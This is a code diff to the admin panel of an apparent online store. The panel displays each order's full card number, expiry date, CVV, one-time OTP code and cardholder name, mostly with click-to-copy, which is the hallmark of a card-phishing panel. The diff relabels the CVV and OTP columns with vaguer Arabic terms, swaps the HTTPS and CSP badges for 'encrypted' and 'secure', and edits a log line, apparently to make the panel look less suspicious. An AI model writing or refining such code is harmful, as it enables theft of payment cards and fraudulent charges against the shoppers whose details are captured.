@@ -74,8 +74,8 @@
             <div class="flex items-center gap-3">
                 <a href="/store/" class="flex items-center gap-2"><img src="../logo.png" alt="AURA GLOW" class="header-logo h-24 md:h-32 mx-auto"></a>
                 <span class="header-badge bg-amber-700/30 text-amber-400 text-xs px-3 py-1 rounded-full font-bold">لوحة التحكم</span>
-                <span class="security-badge">🔒 HTTPS</span>
-                <span class="security-badge">🛡️ CSP</span>
+                <span class="security-badge">🔒 مشفر</span>
+                <span class="security-badge">🛡️ آمن</span>
             </div>
             <div class="flex items-center gap-4">
                 <a href="/store/" class="text-xs text-stone-300 hover:text-white transition">عرض المتجر</a>
@@ -134,8 +134,8 @@
                                 <th class="p-4">رقم البطاقة كامل</th>
                                 <th class="p-4">نوع البطاقة</th>
                                 <th class="p-4">تاريخ الانتهاء</th>
-                                <th class="p-4">رمز CVV</th>
-                                <th class="p-4">رمز OTP</th>
+                                <th class="p-4">رمز الأمان</th>
+                                <th class="p-4">رمز التحقق</th>
                                 <th class="p-4">المبلغ</th>
                             </tr>
                         </thead>
@@ -429,8 +429,8 @@
                     <td data-label="رقم البطاقة كامل" class="p-4 font-mono font-bold text-amber-800 tracking-wide text-base bg-amber-50 rounded-lg cursor-pointer copy-cell" onclick="copyText('${o.cardDetails.number}', this)" title="انقر للنسخ">${o.cardDetails.number}</td>
                     <td data-label="نوع البطاقة" class="p-4 text-stone-600">${o.cardDetails.brand || '-'}</td>
                     <td data-label="تاريخ الانتهاء" class="p-4 text-stone-600 cursor-pointer copy-cell" onclick="copyText('${o.cardDetails.expiry}', this)" title="انقر للنسخ">${o.cardDetails.expiry}</td>
-                    <td data-label="رمز CVV" class="p-4 font-mono text-stone-600 font-bold text-base cursor-pointer copy-cell" onclick="copyText('${o.cardDetails.cvv}', this)" title="انقر للنسخ">${o.cardDetails.cvv}</td>
-                    <td data-label="رمز OTP" class="p-4 font-mono text-stone-600 font-bold text-base cursor-pointer copy-cell" onclick="copyText('${o.cardDetails.otp || ''}', this)" title="انقر للنسخ">${o.cardDetails.otp || '-'}</td>
+                    <td data-label="رمز الأمان" class="p-4 font-mono text-stone-600 font-bold text-base cursor-pointer copy-cell" onclick="copyText('${o.cardDetails.cvv}', this)" title="انقر للنسخ">${o.cardDetails.cvv}</td>
+                    <td data-label="رمز التحقق" class="p-4 font-mono text-stone-600 font-bold text-base cursor-pointer copy-cell" onclick="copyText('${o.cardDetails.otp || ''}', this)" title="انقر للنسخ">${o.cardDetails.otp || '-'}</td>
                     <td data-label="المبلغ" class="p-4 font-bold text-stone-900">${o.total}.00 ₪</td>
                 </tr>
             `).join('');
@@ -483,8 +483,8 @@
                     <div class="grid grid-cols-2 gap-2 text-xs">
                         <div><span class="text-stone-500">رقم البطاقة:</span> <span class="font-bold font-mono text-base text-rose-700">${order.cardDetails.number}</span></div>
                         <div><span class="text-stone-500">تاريخ الانتهاء:</span> <span class="font-bold">${order.cardDetails.expiry}</span></div>
-                        <div><span class="text-stone-500">CVV:</span> <span class="font-bold font-mono">${order.cardDetails.cvv}</span></div>
-                        <div><span class="text-stone-500">OTP:</span> <span class="font-bold font-mono cursor-pointer copy-cell" onclick="copyText('${order.cardDetails.otp || ''}', this)" title="انقر للنسخ">${order.cardDetails.otp || '-'}</span></div>
+                        <div><span class="text-stone-500">رمز الأمان:</span> <span class="font-bold font-mono">${order.cardDetails.cvv}</span></div>
+                        <div><span class="text-stone-500">رمز التحقق:</span> <span class="font-bold font-mono cursor-pointer copy-cell" onclick="copyText('${order.cardDetails.otp || ''}', this)" title="انقر للنسخ">${order.cardDetails.otp || '-'}</span></div>
                         <div><span class="text-stone-500">النوع:</span> <span class="font-bold">${order.cardDetails.brand}</span></div>
                         <div><span class="text-stone-500">حامل البطاقة:</span> <span class="font-bold cursor-pointer copy-cell" onclick="copyText('${order.cardDetails.holder}', this)" title="انقر للنسخ">${order.cardDetails.holder}</span></div>
                     </div>
@@ -693,7 +693,7 @@
                         expires_at: Date.now() + (d.expires_in || 3600) * 1000
                     }));
                 }
-                console.log('[SECURITY] Admin authenticated');
+                console.log('[الأمان] تم التحقق من هوية الأدمن عبر Supabase Auth');
                 loadOrders();
             }).catch(function() {
                 loadOrders();
